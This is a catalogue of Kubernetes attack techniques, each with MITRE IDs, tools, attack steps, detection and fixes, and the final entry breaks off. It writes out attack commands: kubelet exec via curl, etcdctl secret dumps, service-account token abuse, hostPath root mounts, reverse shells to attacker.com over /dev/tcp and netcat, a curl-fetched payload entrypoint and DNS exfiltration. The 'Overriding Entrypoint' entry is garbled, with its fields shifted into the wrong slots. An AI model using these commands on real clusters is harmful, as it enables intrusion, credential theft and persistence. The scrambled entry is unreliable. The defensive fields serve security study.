## Gaining Remote Shell via Open Kubelet Debug Handler

- **Attack Type**: K8s Misconfiguration – Debug Abuse
- **Target**: Pod Containers
- **Vulnerability**: Open /run/ handler
- **MITRE**: T1059.004
- **Impact**: Remote command execution
- **Tools**: curl, curlrc, bash
- **Scenario**: Handler /run/<pod> can be abused to get shell access into containers
- **Attack Steps**: 1. Red Team discovers open port 10250 with /run/ handler enabled.2. They run: curl -k -XPOST https://<node>:10250/run/<namespace>/<pod>/<container>?cmd=/bin/bash.3. This spawns a remote shell inside the container, similar to kubectl exec.4. Since kubelet doesn't validate origin, attacker does not need kubeconfig.5. If pod has elevated permissions or mounts host volumes, lateral access is possible.6. Blue Team may not have endpoint visibility into kubelet API misuse.7. Only host-level EDRs or runtime monitoring can detect post-exploitation behavior.
- **Detection**: Container logs (if captured)
- **Solution**: Disable debug handlers, restrict access
- **Tags**: #kubeletdebug #rce #k8sunauth

## Extracting Secrets by Accessing Exposed ETCD Port

- **Attack Type**: K8s Misconfiguration – ETCD Abuse
- **Target**: etcd DB
- **Vulnerability**: No auth or TLS on etcd
- **MITRE**: T1552
- **Impact**: Credential theft & impersonation
- **Tools**: etcdctl, curl
- **Scenario**: Unauthenticated etcd endpoint allows retrieval of secrets stored in plaintext
- **Attack Steps**: 1. Red Team locates etcd endpoint at port 2379 (default) exposed to the internal network.2. Uses etcdctl get / --prefix --keys-only to list keys.3. Then retrieves values with etcdctl get /registry/secrets/kube-system/....4. Secrets may include base64-encoded tokens, service credentials, TLS certs.5. These are decoded and reused to impersonate services or escalate.6. No etcd auth or mTLS results in full data exfiltration.7. Blue Team often unaware due to lack of logging in etcd.8. Strongly recommended to restrict etcd with network ACLs and enable encryption at rest.
- **Detection**: etcd logs (if available), netflow
- **Solution**: Enable etcd auth + firewall ACLs
- **Tags**: #etcdexposure #secretdump #k8smisconfig

## Abusing Kubernetes Dashboard Without Login

- **Attack Type**: K8s Misconfiguration – Dashboard
- **Target**: Dashboard Pod
- **Vulnerability**: Dashboard exposed to public
- **MITRE**: T1078
- **Impact**: UI-based full cluster takeover
- **Tools**: Web browser, curl
- **Scenario**: Public access to dashboard allows full cluster visibility or control
- **Attack Steps**: 1. Red Team finds a dashboard running at /api/v1/namespaces/kube-system/services/https:kubernetes-dashboard:/proxy/.2. Authentication is disabled or session tokens are hardcoded in HTML.3. Using browser or curl, attacker views workloads, secrets, volumes, and logs.4. Can create/delete deployments or service accounts.5. Full compromise if dashboard has admin rights.6. Dashboard often exposed via Ingress without proper firewall.7. Blue Team misses this unless access is restricted via OIDC or mTLS.8. Logs may not show external IPs unless proxy is configured to record.
- **Detection**: Ingress logs, Proxy logs
- **Solution**: Restrict dashboard via RBAC + auth
- **Tags**: #dashboard #exposure #kubernetesui

## SSRF to Internal K8s Services from Vulnerable App

- **Attack Type**: Indirect Access – SSRF Pivot
- **Target**: App Pod
- **Vulnerability**: SSRF to internal services
- **MITRE**: T1499
- **Impact**: Lateral move to K8s infra
- **Tools**: curl, Burp Suite, SSRF payloads
- **Scenario**: Web app SSRF hits kubelet or metadata APIs
- **Attack Steps**: 1. Red Team identifies SSRF in exposed web app (e.g., curl http://127.0.0.1:80?url=...).2. Sends SSRF payload to http://169.254.169.254/ for metadata or to http://<kubelet>:10250/pods/.3. Successfully leaks pod info or IAM tokens.4. If kubelet or dashboard is exposed, attacker can escalate.5. SSRF allows bypass of perimeter even without kubeconfig.6. Blue Team may miss internal calls unless WAF or SSRF-specific rules are in place.7. Response headers and log correlation can help trace.
- **Detection**: Web app logs, metadata logs
- **Solution**: Prevent SSRF in code & firewall
- **Tags**: #ssrf #pivot #k8sinternal

## Detecting Privileged Pod Launch from Kubelet Exec Abuse

- **Attack Type**: Privilege Misuse – Pod Creation
- **Target**: Kubelet Port
- **Vulnerability**: Kubelet allows privileged pod launch
- **MITRE**: T1611
- **Impact**: Full host compromise
- **Tools**: curl, YAML template
- **Scenario**: Use kubelet to create pods with host access and root
- **Attack Steps**: 1. Red Team gains kubelet access and crafts YAML for a privileged pod with hostPID: true, hostNetwork: true.2. Sends request to kubelet /pods API to create this pod.3. Once running, attacker enters via /exec/ and maps the host.4. Full host access is achieved if --privileged is set.5. Blue Team misses this if kubelet logs are not captured.6. Recommend alerting on privileged pod creation and enforcing PodSecurityPolicies.
- **Detection**: PodSpec audits, container logs
- **Solution**: Block privileged via admission
- **Tags**: #kubeletexec #hostaccess #k8sprivesc

## Exploiting ClusterRoleBinding to Gain Cluster Admin

- **Attack Type**: RBAC Misconfiguration – Privilege Escalation
- **Target**: K8s Control Plane
- **Vulnerability**: Overly broad RBAC binding
- **MITRE**: T1068
- **Impact**: Full cluster takeover
- **Tools**: kubectl, Kube-hunter, Lens IDE
- **Scenario**: Attacker discovers overly permissive ClusterRoleBinding linked to service account
- **Attack Steps**: 1. Red Team gets access to a pod with default service account tokens mounted.2. They list service account token permissions using kubectl auth can-i --list --token=$TOKEN.3. They find the token is bound to cluster-admin role via ClusterRoleBinding.4. Using this, they issue cluster-wide commands such as kubectl get secrets -A, kubectl apply -f <malicious.yaml> to create backdoors.5. They launch privileged pods, read config maps, and install DaemonSets.6. The access effectively gives them root across the cluster.7. Blue Team typically misses this if RBAC audit logs or API access monitoring is not enabled.8. They persist using cronjobs or modifying deployments silently.
- **Detection**: Kubernetes audit logs, RBAC logs
- **Solution**: Principle of least privilege for ClusterRoles
- **Tags**: #rbacabuse #clusteradmin #k8sprivilegeescalation

## Discovering Hidden Cluster Role Bindings in Forgotten Namespaces

- **Attack Type**: Privilege Enumeration via RBAC
- **Target**: Forgotten Namespaces
- **Vulnerability**: Stale ClusterRoleBindings
- **MITRE**: T1078
- **Impact**: Lateral access to prod-like environments
- **Tools**: kubectl, RBAC Lookup Tool
- **Scenario**: Attackers enumerate bindings in dev/test namespaces that escalate access
- **Attack Steps**: 1. Red Team compromises a container in a forgotten dev namespace.2. They run kubectl get clusterrolebinding -A to enumerate all cluster-wide bindings.3. They locate a stale ClusterRoleBinding from an old CI/CD job granting admin or edit rights.4. They validate the linked service account using kubectl get sa <name> -n <namespace> and retrieve its token.5. Using kubectl --token=$TOKEN they now pivot into higher-privileged namespaces.6. This lateral escalation is usually unmonitored in stale environments.7. Blue Team lacks visibility if RBAC review is not automated.8. Attacker persists by redeploying backdoored containers via existing permissions.
- **Detection**: RBAC mappings, role review logs
- **Solution**: Use rbac-police or Kyverno policies
- **Tags**: #rbacdrift #forgottenbindings #kubernetesaccesscontrol

## Dumping ETCD Secrets Without Authentication

- **Attack Type**: Direct Access – ETCD Port
- **Target**: etcd Storage Backend
- **Vulnerability**: No auth / TLS disabled
- **MITRE**: T1552
- **Impact**: Compromise of stored secrets
- **Tools**: etcdctl, curl
- **Scenario**: Unauthenticated access to etcd on port 2379 leads to secrets dump
- **Attack Steps**: 1. Red Team discovers etcd running on default port 2379 via network scan.2. No authentication or TLS is configured.3. They run etcdctl get /registry/secrets/ --prefix to dump secret objects.4. Data includes base64-encoded tokens, certs, configs, and keys for service accounts and applications.5. Attacker decodes secrets and pivots into K8s API with real service credentials.6. They impersonate critical services, access dashboards, and inject malware.7. Since etcd is rarely monitored, this goes undetected unless network IDS is configured.8. Blue Team fails to detect due to lack of logging, encryption, and endpoint protection.
- **Detection**: Network flows, etcd audit logs
- **Solution**: Encrypt etcd + enable TLS + RBAC
- **Tags**: #etcd #secretdump #credentialtheft

## ETCD Persistence via Backdoored Secret Injection

- **Attack Type**: Secret Injection – Persistent Backdoor
- **Target**: etcd DB
- **Vulnerability**: Direct etcd write access
- **MITRE**: T1609
- **Impact**: Secret-level persistence
- **Tools**: etcdctl, kubectl, YAML templates
- **Scenario**: Backdoor secrets planted in etcd using write access
- **Attack Steps**: 1. Red Team finds they can write to etcd using etcdctl put.2. They craft a secret YAML with an embedded SSH key or AWS token.3. They insert it via etcdctl put /registry/secrets/dev/backdoor <payload>.4. Kubernetes control plane syncs this backdoor secret to the respective namespace.5. Malicious pod retrieves and uses this secret to exfil data or pivot.6. Since no RBAC logs are triggered (this bypasses K8s API), detection is difficult.7. Blue Team doesn't notice because etcd events aren't logged by default.8. Only a forensics check of etcd contents would reveal this tampering.
- **Detection**: etcd logs (if enabled), config diffs
- **Solution**: Monitor etcd writes, restrict access
- **Tags**: #etcdinjection #secretpersistence #k8sbackdoor

## Escalating Privileges Using HostPath Volume in Pod

- **Attack Type**: Host Volume Mount – Escalation
- **Target**: Worker Nodes
- **Vulnerability**: Arbitrary hostPath mounts allowed
- **MITRE**: T1611
- **Impact**: Full access to node filesystem
- **Tools**: kubectl, bash, Alpine container
- **Scenario**: Attackers use hostPath to access /etc or /root from a pod
- **Attack Steps**: 1. Red Team gains access to a pod spec with privileges to mount arbitrary volumes.2. They modify deployment YAML to include:volumeMounts: { mountPath: /host, name: rootvol } andvolumes: { name: rootvol, hostPath: { path: / }}.3. New pod starts and mounts the host root (/) into the container under /host.4. Attacker browses host files: /host/etc/shadow, /host/root/.ssh.5. This exposes secrets, credentials, and enables full host compromise.6. Blue Team may not have PodSecurityPolicies or admission control to stop this.7. Log visibility into hostPath mounts is limited without runtime enforcement.
- **Detection**: Pod logs, admission logs
- **Solution**: Enforce PodSecurityPolicy and OPA Gatekeeper
- **Tags**: #hostpath #filesystemaccess #privilegeescalation

## Escalation via DaemonSet Deployment from Compromised Pod

- **Attack Type**: Lateral Movement – DaemonSet Abuse
- **Target**: Cluster Nodes
- **Vulnerability**: Excessive create privileges on DaemonSets
- **MITRE**: T1525
- **Impact**: Persistent lateral control
- **Tools**: kubectl, malicious DaemonSet YAML
- **Scenario**: Use permissions to deploy backdoored DaemonSet across all nodes
- **Attack Steps**: 1. Attacker compromises a pod with create access to DaemonSets.2. They deploy a DaemonSet with malicious container image (e.g., with reverse shell).3. The DaemonSet propagates a backdoor container to all cluster nodes.4. Backdoored containers listen on outbound ports and provide attacker full node access.5. Since DaemonSet pods run on every node, the attacker ensures persistence.6. Blue Team may not detect unless image scanning and behavior alerts exist.7. Logging only shows a DaemonSet deployment, not its intent.8. Effective defense includes restricting DaemonSet usage in production.
- **Detection**: Kube audit logs, container egress
- **Solution**: Restrict DS deployment rights
- **Tags**: #daemonsetabuse #k8slateral #nodebackdoor

## Gaining Root via runAsUser: 0 in Pod Spec

- **Attack Type**: Privileged Container Execution
- **Target**: Application Pod
- **Vulnerability**: runAsUser not restricted
- **MITRE**: T1068
- **Impact**: Root inside container
- **Tools**: kubectl, YAML deployment
- **Scenario**: Pod starts as root user allowing system-level actions
- **Attack Steps**: 1. Attacker modifies deployment to include securityContext: { runAsUser: 0 }.2. Pod now runs processes as root inside container.3. If combined with hostPath, ptrace, or debug tools, host compromise is possible.4. Red Team uses this root context to modify mounted volumes, intercept traffic, or install tools.5. Blue Team often doesn't validate effective UID inside containers.6. PodSecurityPolicy or OPA Gatekeeper can prevent root containers but may be misconfigured.7. Attackers maintain access using cron or bash loop inside container.
- **Detection**: Pod spec review, runtime alerts
- **Solution**: Use PSPs or restrict root UID
- **Tags**: #runasroot #securitycontext #k8scontainer

## Privilege Escalation via Access to Secrets Mount

- **Attack Type**: Misused Secret Mount
- **Target**: Application Pods
- **Vulnerability**: Auto-mounted tokens
- **MITRE**: T1552
- **Impact**: API access via service token
- **Tools**: kubectl, bash
- **Scenario**: Access auto-mounted secrets to impersonate services
- **Attack Steps**: 1. Red Team accesses pod’s /var/run/secrets/kubernetes.io/serviceaccount/token.2. This token provides API access tied to the pod’s service account.3. Using curl -H \"Authorization: Bearer $TOKEN\" they access API server endpoints.4. If RBAC is lax, they can list secrets, configmaps, or create new resources.5. Attack is subtle, as token usage mimics legitimate pod behavior.6. Blue Team only notices if anomalous token activity is logged.7. Attackers can automate scanning using in-cluster curl or Python scripts.
- **Detection**: API audit logs
- **Solution**: Rotate service account tokens & restrict mount
- **Tags**: #tokenabuse #serviceaccount #k8sapi

## Privilege Persistence via CronJob with Malicious Image

- **Attack Type**: Backdoor via Scheduled Job
- **Target**: Cluster Scheduler
- **Vulnerability**: Lack of CronJob validation
- **MITRE**: T1053
- **Impact**: Long-term cluster persistence
- **Tools**: kubectl, CronJob YAML
- **Scenario**: Persist access via scheduled container execution
- **Attack Steps**: 1. Red Team creates a CronJob with a malicious container that phones home every hour.2. Job is scheduled via YAML and deployed using existing permissions.3. Image contains reverse shell or secret exfil script.4. Blue Team typically ignores CronJobs assuming they're benign batch jobs.5. Attack persists even after pod or session restarts.6. Detecting requires monitoring for unusual image hashes or outbound traffic from CronJob pods.
- **Detection**: CronJob manifests, egress logs
- **Solution**: Audit all CronJobs and enforce allow-list
- **Tags**: #k8scron #persistence #malwarecontainer

## Elevating Access via Pod Exec into Internal Services

- **Attack Type**: Pod Exec – Lateral Movement
- **Target**: Application Pods
- **Vulnerability**: Pod exec permissions open
- **MITRE**: T1570
- **Impact**: Internal lateral movement
- **Tools**: kubectl, netcat, bash
- **Scenario**: Abusing kubectl exec to move between pods and services
- **Attack Steps**: 1. Red Team has pod access with exec permissions.2. Using kubectl exec -it <pod> -- /bin/bash, they access shell inside container.3. From there, they scan internal endpoints using netcat or curl.4. Access internal services, metadata APIs, DBs, and escalate privileges.5. No network policies allow free east-west movement.6. Blue Team often lacks PodExec logs or connection tracing.7. Detection requires strict role restrictions on pods/exec and runtime network monitoring.
- **Detection**: K8s audit logs, runtime tools
- **Solution**: Limit pod exec to trusted roles
- **Tags**: #podexec #lateralaccess #kubernetesattack

## Deploying Reverse Shell via Malicious Init Container

- **Attack Type**: Init Container Abuse
- **Target**: Application Pod
- **Vulnerability**: Inspected init containers
- **MITRE**: T1059.004
- **Impact**: Early-stage reverse shell
- **Tools**: kubectl, Netcat, Bash
- **Scenario**: Attacker embeds a reverse shell into an init container that runs before the main app
- **Attack Steps**: 1. Red Team modifies a deployment to include an init container with a reverse shell payload.2. The init container starts first before the main container, running a command like bash -i >& /dev/tcp/attacker.com/4444 0>&1.3. The attacker’s listener receives shell access to the container before the main app launches.4. Since init containers are often overlooked, Blue Team may miss malicious logic.5. Attacker uses early access to set file permissions, plant SSH keys, or alter environment variables for main container.6. Blue Team typically doesn't inspect init container behavior.7. Attack provides stealthy foothold without altering the application container directly.
- **Detection**: Pod logs, Egress alerts
- **Solution**: Enforce scanning of all init containers
- **Tags**: #initcontainer #stealthbackdoor #k8sreverseshell

## Overriding Entrypoint to Hijack Container Behavior

- **Attack Type**: Container Entrypoint Tampering
- **Target**: bash; exec app"]`.3. Payload script sets up cronjobs, reverse shells, or steals environment variables.4. Application still starts, masking the behavior.5. Blue Team assumes normal entrypoint is active and may miss malicious shell execution.6. Entrypoint overrides are rarely flagged unless strict runtime policies are in place.
- **Vulnerability**: Containerized App
- **MITRE**: Overridden entrypoints
- **Impact**: T1203
- **Tools**: Dockerfile, kubectl
- **Scenario**: Attacker overrides entrypoint to execute malicious script before app starts
- **Attack Steps**: 1. Attacker injects command and args fields in a deployment spec to override the container’s entrypoint.2. They run `["sh", "-c", "curl attacker.com/payload.sh
- **Detection**: Covert pre-app execution
- **Solution**: Runtime logs, file diffs
- **Tags**: Disallow unverified entrypoint overrides

## Host Escalation via cgroups Exploit from Container

- **Attack Type**: Kernel Exploit via Misconfigured cgroups
- **Target**: Worker Node
- **Vulnerability**: Unpatched cgroup vuln + privileges
- **MITRE**: T1068
- **Impact**: Host takeover from container
- **Tools**: Alpine container, Exploit script
- **Scenario**: Exploit CVE-2022-0492 to break from container and gain root on host
- **Attack Steps**: 1. Attacker runs a malicious container with capabilities like CAP_SYS_ADMIN and cgroup mounts.2. They execute a PoC for CVE-2022-0492 which abuses cgroup v1/v2 and misconfigured seccomp to escape container.3. After successful exploit, attacker gains shell on host node as root.4. They install persistence tools and dump container images from the host’s Docker directory.5. Exploit leaves minimal traces unless kernel audit logs or runtime detection is in place.
- **Detection**: Kernel logs, Falco
- **Solution**: Patch kernel, restrict container capabilities
- **Tags**: #cve20220492 #cgroups #containerescape

## Compromising Cloud Metadata via Container Escape

- **Attack Type**: Metadata API Abuse
- **Target**: Cloud-Hosted Pod
- **Vulnerability**: Metadata endpoint exposed
- **MITRE**: T1552.005
- **Impact**: Cloud-level lateral movement
- **Tools**: curl, AWS CLI, GCP CLI
- **Scenario**: From container, access cloud metadata API to steal IAM tokens
- **Attack Steps**: 1. Attacker in a pod accesses metadata endpoint at http://169.254.169.254/latest/meta-data/.2. They extract temporary cloud credentials (e.g., AWS STS tokens).3. Using AWS CLI, they enumerate and access cloud resources: aws s3 ls, aws ec2 describe-instances.4. This bypasses Kubernetes RBAC and directly affects cloud account.5. Many cloud workloads still leave metadata APIs unprotected.6. Blue Team must monitor unusual API calls from pods to metadata IP.
- **Detection**: VPC flow logs, runtime alerts
- **Solution**: Block metadata IP or use IMDSv2
- **Tags**: #cloudpivot #metadataapi #iamabuse

## Credential Theft via Mounted Service Account Token

- **Attack Type**: Pod Token Theft
- **Target**: Any Pod
- **Vulnerability**: Auto-mounted wide-scope tokens
- **MITRE**: T1557.002
- **Impact**: Full API access
- **Tools**: bash, curl, Postman
- **Scenario**: Attacker dumps /var/run/secrets/.../token and reuses it in Postman or curl
- **Attack Steps**: 1. Inside a container, attacker locates mounted service account token file.2. Reads token using cat /var/run/secrets/kubernetes.io/serviceaccount/token.3. Uses token in API requests with curl: curl -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api/v1/secrets.4. If token has wide permissions, attacker can read secrets or spawn more pods.5. Many clusters mount tokens automatically to all pods.6. Blue Team should disable auto-mount and restrict token usage.
- **Detection**: API server logs
- **Solution**: Use minimal RBAC + disable auto-mount
- **Tags**: #tokenreuse #k8sapihack #servicetoken

## Staging Persistent Malware via Shared Volume

- **Attack Type**: Shared Volume Abuse
- **Target**: Multi-pod workload
- **Vulnerability**: Shared PVC writable by attacker
- **MITRE**: T1547
- **Impact**: Cross-pod persistence
- **Tools**: PV/PVC, bash, Alpine image
- **Scenario**: Use a shared volume to persist scripts accessible by multiple pods
- **Attack Steps**: 1. Attacker modifies a deployment to use a PersistentVolume (e.g., NFS mount).2. They store a backdoor script or binary (/data/evil.sh) in the shared volume.3. Other pods using the same PVC mount the volume and execute the malicious file.4. Blue Team may miss this as it resembles normal inter-pod sharing.5. This bypasses container immutability and leads to cross-pod persistence.
- **Detection**: PVC access logs, audit tools
- **Solution**: Restrict PVC write access
- **Tags**: #persistentvolume #malwarepersistence #k8ssharedstorage

## DaemonSet Used to Deploy Crypto Miners

- **Attack Type**: Lateral Spread – Resource Hijacking
- **Target**: Worker Nodes
- **Vulnerability**: Misused DaemonSet
- **MITRE**: T1496
- **Impact**: Crypto resource drain
- **Tools**: DaemonSet YAML, XMRig
- **Scenario**: Backdoored DaemonSet used to mine Monero on all cluster nodes
- **Attack Steps**: 1. Red Team has access to a compromised pod with DaemonSet deploy privileges.2. They create a DaemonSet that runs XMRig miner on all worker nodes.3. Miner runs quietly in background using low CPU, avoids detection.4. Cluster resource usage spikes slightly, but no alerts fire.5. Blue Team only detects this with runtime threat detection or billing anomaly.
- **Detection**: Cloud cost reports, Falco alerts
- **Solution**: Restrict DS usage, monitor CPU anomalies
- **Tags**: #cryptojacking #daemonset #k8sminer

## Exploiting kubelet’s /run/containerd Path

- **Attack Type**: Socket Hijack – containerd Escape
- **Target**: Container Runtime
- **Vulnerability**: containerd socket exposed
- **MITRE**: T1609
- **Impact**: Full host control
- **Tools**: containerd CLI, nsenter
- **Scenario**: Exploit open /run/containerd/containerd.sock to interact with host
- **Attack Steps**: 1. Attacker mounts host path /run/containerd/containerd.sock into container.2. Using containerd tools, they list containers, create new ones, or modify existing ones.3. Can escalate by starting privileged container with full host mount.4. This gives control similar to Docker socket abuse.5. Blue Team may miss access unless runtime enforcement exists.
- **Detection**: Runtime logs
- **Solution**: Do not expose containerd.sock
- **Tags**: #containerdescape #socketabuse #k8sexploit

## Exploiting Misconfigured Admission Controller to Deploy Unsafe Pods

- **Attack Type**: Admission Controller Bypass
- **Target**: Cluster API
- **Vulnerability**: Disabled/misconfigured webhook
- **MITRE**: T1609
- **Impact**: Security policy bypass
- **Tools**: Kubernetes API, OPA
- **Scenario**: Upload pods that violate security policies due to disabled admission hooks
- **Attack Steps**: 1. Red Team uploads a pod with dangerous settings: privileged: true, hostNetwork: true, runAsUser: 0.2. Normally denied by OPA/Gatekeeper or PodSecurityAdmission.3. But if admission webhook is disabled or misconfigured, pod is accepted.4. Pod executes kernel exploits or dumps host files.5. Blue Team fails to detect because admission controller logs are not reviewed.
- **Detection**: API logs, runtime events
- **Solution**: Ensure admission webhooks are enforced
- **Tags**: #opa #admissioncontroller #k8ssecurity

## Persisting via Custom Controller in Control Plane

- **Attack Type**: Malicious Operator Deployment
- **Target**: Control Plane
- **Vulnerability**: Malicious controller logic
- **MITRE**: T1546
- **Impact**: Auto-reinfection & backdoor
- **Tools**: GoLang, Kubernetes SDK
- **Scenario**: Deploy controller that watches resources and reinjects attacker config
- **Attack Steps**: 1. Attacker uploads a custom Kubernetes controller as a deployment.2. The controller watches events like Pod deletions or ConfigMap changes.3. When defender tries to delete the attacker's resource, controller recreates it silently.4. Persistence achieved through self-healing backdoor.5. Blue Team must inspect controllers running with elevated permissions.
- **Detection**: Event logs, process tree
- **Solution**: Validate all 3rd party controllers
- **Tags**: #customcontroller #k8soperator #persistence

## Root Escalation via hostPID and hostNetwork

- **Attack Type**: Pod Specification Abuse
- **Target**: K8s Worker Node
- **Vulnerability**: Insecure Pod Configs
- **MITRE**: T1611
- **Impact**: Full host access via pod abuse
- **Tools**: kubectl, nsenter
- **Scenario**: Abuse pod spec fields hostPID: true and hostNetwork: true to interact with host processes
- **Attack Steps**: 1. Red Team creates a pod with hostPID: true and hostNetwork: true, allowing the container to see and interact with host process IDs and networking.2. The container runs nsenter to enter the host namespaces for process, network, and mount.3. Attacker spawns a shell within the host environment, bypassing container isolation.4. From there, system files are modified or credentials exfiltrated.5. Blue Team may miss this if pod security policies are not enforced.6. This attack requires minimal tools but gives full host visibility.
- **Detection**: Pod security policies (PSPs), kube audit logs
- **Solution**: Block hostPID, enforce OPA policies
- **Tags**: #hostPID #hostNetwork #k8sescalation

## Malicious Image Side-loading via Localhost Registry

- **Attack Type**: Image Injection Attack
- **Target**: K8s Cluster
- **Vulnerability**: No image scanning, insecure registry
- **MITRE**: T1608.001
- **Impact**: Execution of untrusted images
- **Tools**: Docker, Local Registry, kubectl
- **Scenario**: Push backdoored image to a local registry and deploy without scanning
- **Attack Steps**: 1. Attacker gains access to internal registry (e.g., localhost:5000).2. They build and push a backdoored image: docker push localhost:5000/backdoor:v1.3. Then modify a deployment YAML to pull image from this registry.4. Since this is a local registry, image scanning and trust verification are usually bypassed.5. Backdoor activates at runtime, giving shell access or exfiltrating secrets.6. Blue Team often ignores internal registries assuming trust.
- **Detection**: Registry access logs
- **Solution**: Enforce scanning even for internal sources
- **Tags**: #backdooredimage #localscan #registryabuse

## Exploiting Over-Privileged Service Accounts

- **Attack Type**: RBAC Misuse
- **Target**: Cluster-wide
- **Vulnerability**: Excessive RBAC Permissions
- **MITRE**: T1069.003
- **Impact**: Cluster takeover
- **Tools**: kubectl, kube-hunter
- **Scenario**: Compromise a pod with wide RBAC, then create cluster-level resources
- **Attack Steps**: 1. Attacker finds a pod where the service account has create access on pods and roles.2. Using this access, they spawn a new pod with elevated privileges or bind a role to cluster-admin.3. They can now deploy malware or exfiltrate secrets cluster-wide.4. RBAC roles are often misconfigured, especially in dev clusters.5. Blue Team may lack audit tooling for RBAC changes.6. Attack allows lateral and vertical privilege escalation.
- **Detection**: API audit logs
- **Solution**: Enforce least privilege RBAC
- **Tags**: #rbacmisuse #k8sroleabuse #clusteradmin

## Gaining Persistence via Mutating Admission Webhook

- **Attack Type**: Webhook Manipulation
- **Target**: K8s API Layer
- **Vulnerability**: Misused Admission Webhooks
- **MITRE**: T1609
- **Impact**: Persistent backdoor injection
- **Tools**: GoLang, TLS Webhook Server
- **Scenario**: Use a malicious mutating webhook to auto-inject backdoors into every new pod
- **Attack Steps**: 1. Red Team deploys a mutating admission webhook that injects malicious init containers into new pods.2. This webhook is registered at the API level and listens for pod creation events.3. On each new pod, it modifies the spec to include attacker’s logic, such as reverse shells or token stealers.4. Webhook is deployed with a legitimate TLS certificate, making detection difficult.5. Blue Team may overlook webhook behaviors unless specific logging is configured.6. This attack achieves stealthy persistence cluster-wide.
- **Detection**: API events, webhook logs
- **Solution**: Whitelist only trusted admission webhooks
- **Tags**: #mutatingwebhook #persistence #k8sapi

## Backdooring a Helm Chart to Deliver Malicious Workloads

- **Attack Type**: Supply Chain Tampering
- **Target**: DevSecOps Tooling
- **Vulnerability**: Helm chart trust issue
- **MITRE**: T1195.002
- **Impact**: Hidden malicious deployment
- **Tools**: Helm, YAML, Base64, GitHub
- **Scenario**: Modify Helm chart values or templates to deploy malware when installed
- **Attack Steps**: 1. Attacker clones a Helm chart repo and modifies values.yaml to include a malicious container (e.g., crypto miner or reverse shell).2. Re-hosts the chart on a public repo or compromises an internal repo.3. User installs the chart without inspecting templates.4. Malicious container runs hidden in the background alongside legitimate services.5. Blue Team may not notice unless Helm deployments are verified via diffs.6. Attack leverages CI/CD trust in infrastructure as code.
- **Detection**: Helm diff tools, pod analysis
- **Solution**: Always inspect and diff Helm templates
- **Tags**: #helmsupplychain #k8sbackdoor #chartattack

## Reverse Shell via Exec in CronJob Pod

- **Attack Type**: Scheduled Job Abuse
- **Target**: Job Controller
- **Vulnerability**: Misused CronJob privileges
- **MITRE**: T1053.005
- **Impact**: Scheduled access backdoor
- **Tools**: kubectl, Netcat, CronJob YAML
- **Scenario**: Abuse CronJobs to schedule periodic reverse shells from cluster
- **Attack Steps**: 1. Red Team creates a CronJob with a container that runs every 10 minutes and initiates a reverse shell (nc attacker.com 4444 -e /bin/bash).2. CronJob is disguised with a benign name like log-rotate.3. Attacker gets shell access periodically, evading detection since pod runs briefly.4. Blue Team may miss it unless actively monitoring job creations.5. Attack provides recurring access without long-lived pods.
- **Detection**: Pod lifecycle logs
- **Solution**: Alert on unusual CronJobs
- **Tags**: #cronjobabuse #k8sscheduling #stealthshell

## Exfiltrating Kubernetes Secrets via DNS Tunneling

- **Attack Type**: Data Exfiltration via DNS
- **Target**: Cluster DNS
- **Vulnerability**: Unrestricted DNS egress
- **MITRE**: T1048.003
- **Impact**: Secret theft via DNS
- **Tools**: dig, base64, DNS server
- **Scenario**: Encode secrets and exfiltrate through DNS queries from inside pods
- **Attack Steps**: 1. Attacker inside pod finds secrets (e.g., .dockerconfigjson, AWS creds).2. Encodes secret in Base64 and uses dig to send queries like bWFsaWNpb3VzLmRhdGE=.attacker.com.3. External DNS server controlled by attacker logs and decodes data.4. Avoids traditional HTTP/HTTPS monitoring.5. Blue Team may not inspect egress DNS unless DNS logging is configured.6. Tactic is stealthy and bypasses many DLP solutions.
- **Detection**: DNS logs, entropy checks
- **Solution**: Restrict DNS egress, monitor entropy
- **Tags**: #dnsexfil #k8ssecrets #stealthchannel

## HostPath Volume Mount for SSH Key Theft

- **Attack Type**: Host File Abuse
- **Target**: Host Filesystem
- **Vulnerability**: HostPath mount misuse
- **MITRE**: T1087
- **Impact**: Credential theft & lateral movement
- **Tools**: HostPath, kubectl
- **Scenario**: Mount host /home or /root into pod to steal SSH keys
- **Attack Steps**: 1. Attacker runs pod with volumeMounts targeting host directory /root/.ssh.2. Once mounted, attacker reads private key files and authorized keys.3. They use these credentials to pivot to other systems.4. Blue Team may only notice if file integrity monitoring is enabled.5. Very effective in environments without strict pod security policies.6. Requires minimal tools; attack is low-noise.
- **Detection**: FIM, PSP logs
- **Solution**: Block HostPath or restrict via OPA
- **Tags**: #hostpathsteal #sshabuse #k8smountattack

## Container Escape via CVE-2023-2640 in OverlayFS

- **Attack Type**: Linux Kernel Exploit
- **Target**: Container Host
- **Vulnerability**: Unpatched OverlayFS vuln
- **MITRE**: T1068
- **Impact**: Host compromise via kernel bug
- **Tools**: CVE PoC, overlayfs
- **Scenario**: Exploit kernel vuln in OverlayFS to escape to host
- **Attack Steps**: 1. Attacker identifies cluster node running vulnerable kernel version (e.g., Ubuntu before fix).2. They run PoC that abuses OverlayFS logic to gain arbitrary file write.3. Modify host files such as /etc/shadow or create root cronjobs.4. Attack bypasses container boundaries via kernel bug.5. Detection is difficult unless kernel audit logs or syscall monitors are used.6. Can result in total host compromise.
- **Detection**: Falco, syscalls
- **Solution**: Kernel patching, restrict capabilities
- **Tags**: #cve20232640 #overlayfs #k8skernelattack

## Persistent Infra Access via NodePort Exploitation

- **Attack Type**: External Exposure via NodePort
- **Target**: Cluster Network
- **Vulnerability**: Open NodePort services
- **MITRE**: T1043
- **Impact**: External backdoor access
- **Tools**: kubectl, NodePort YAML
- **Scenario**: Abuse of NodePort to maintain external access to cluster service
- **Attack Steps**: 1. Red Team creates a deployment and exposes it via NodePort on port 30080.2. They run a web shell or C2 interface on that service.3. As long as the NodePort is active, attacker retains external access without firewall configuration.4. NodePort often whitelisted by cloud firewall rules (e.g., GCP/AWS).5. Blue Team may not inspect which pods expose services.6. This method bypasses ingress and runs under the radar.
- **Detection**: Network logs, port scan
- **Solution**: Restrict NodePort usage, audit exposed services
- **Tags**: #nodeportbackdoor #k8sexternalaccess #infraabuse

## Sidecar Container Injection for Covert Access

- **Attack Type**: Pod Spec Manipulation
- **Target**: Application Pods
- **Vulnerability**: Lack of integrity validation on pod specs
- **MITRE**: T1609
- **Impact**: Persistent covert access and eavesdropping
- **Tools**: kubectl, Docker, Bash, Netcat
- **Scenario**: Injecting a malicious sidecar container to tap into sensitive data or create backdoor
